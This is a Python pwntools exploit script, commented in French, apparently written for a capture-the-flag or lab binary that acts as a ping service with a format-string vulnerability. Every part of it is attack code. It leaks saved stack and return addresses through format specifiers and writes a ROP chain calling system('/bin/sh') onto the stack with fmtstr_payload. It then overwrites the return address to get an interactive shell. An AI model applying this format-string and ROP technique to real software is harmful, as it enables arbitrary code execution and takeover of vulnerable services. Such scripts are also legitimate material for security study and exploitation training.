#!/usr/bin/python3
from pwn import *
import re

######################################################
# CONFIGURATION
######################################################
prog = "./vuln"
context.arch = 'amd64'
context.log_level = 'info'

# On lance le processus
p = process(prog)

#######################################################
# ETAPE 1 : Leak des adresses
#######################################################
log.info("=== Etape 1 : Leak des adresses ===")

# On attend de devoir rentrer le ping
p.recvuntil(b"address to ping:")

# Playload de leak : On demande les valeurs aux offsets 7, 27 et 28
# On ajoute 0xee pour faire sauter la condition de boucle qui vérifie que le LSB du RIP est égal à 0xf3
payload = "%26$20p%27$20p%198c%7$hhn" 
p.sendline(payload.encode())

# Parsing de la réponse pour extraire les adresses
raw_response = p.recvuntil(b"ping").decode(errors='ignore')
leaks = re.findall(r"(0x[0-9a-fA-F]+)", raw_response) # On utilise une Regex pour trouver UNIQUEMENT les motifs "0x..."

log.info(f"Données brutes filtrées : {leaks}")
if len(leaks) < 2:
    log.error("Erreur : Pas assez d'adresses récupérées.")

saved_rbp = int(leaks[0], 16) # Saved RBP
saved_rip = int(leaks[1], 16) # Saved RIP

log.success(f"Saved RBP: {hex(saved_rbp)}")
log.success(f"Saved RIP: {hex(saved_rip)}")

##########################################################"
# ETAPE 2 : Calcul des adresses
##########################################################"
log.info("=== Etape 2 : Calcul des adresses ===")

# Calculs des différents offsets 
offset_buffer = 16
dist_buffer_rbp = 80
dist_savedRbp_rbp = 0x7fffffffd830 - 0x7fffffffd810
dist_savedRip_gadget = 0x5555555554f3 - 0x555555555563
dist_savedRip_system = 0x5555555554f3 - 0x555555555100 
dist_savedRip_ret = 0x5555555554f3 - 0x5555555554f9


# Calculs des addresses
addr_system = saved_rip - dist_savedRip_system
addr_gadget = saved_rip - dist_savedRip_gadget
addr_rbp = saved_rbp - dist_savedRbp_rbp
addr_rip = addr_rbp + 8
addr_str = addr_rbp + 40
addr_ret = saved_rip - dist_savedRip_ret

# Structure du shell code
rop_chain = {
    addr_rbp + 16 : addr_gadget,         # adresse pop rdi; ret 
    addr_rbp + 24 : addr_str,            # adresse chaine
    addr_rbp + 32 : addr_system,         # addresse de sytem
    addr_rbp + 40 : u64(b'/bin/sh\x00'), # chaine 
}

###############################################################"
# ETAPE 3 : Ecriture de la chaîne ROP
###############################################################"

# Ecriture du shell code
for addr, value in rop_chain.items():
    # On doit écrire les addresses par bloc de 32 bits sinon les payloads sont trop grand pour le buffer
    lower_value = value & 0xffffffff
    upper_value = value >> 32

    # 32-lsb 
    p.recvuntil("Please Insert an IP address to ping: ".encode())
    payload = fmtstr_payload(offset=offset_buffer, writes = {addr : lower_value, addr_rip : p8(0xee)}, write_size='short')
    p.sendline(payload)

    # 32-msb
    p.recvuntil("Please Insert an IP address to ping: ".encode())
    payload = fmtstr_payload(offset=offset_buffer, writes = {addr + 4 : upper_value, addr_rip : p8(0xee)}, write_size='short')
    p.sendline(payload)


# On place l'addresse du gadget ret à la place de l'addresse de retour ce qui declanche l'execution du shellcode.
addr_ret_lsb = addr_ret & 0xff
payload = f"%{addr_ret_lsb}c%7$hhn"
p.recvuntil("Please Insert an IP address to ping: ".encode())
p.sendline(payload.encode())				


p.interactive()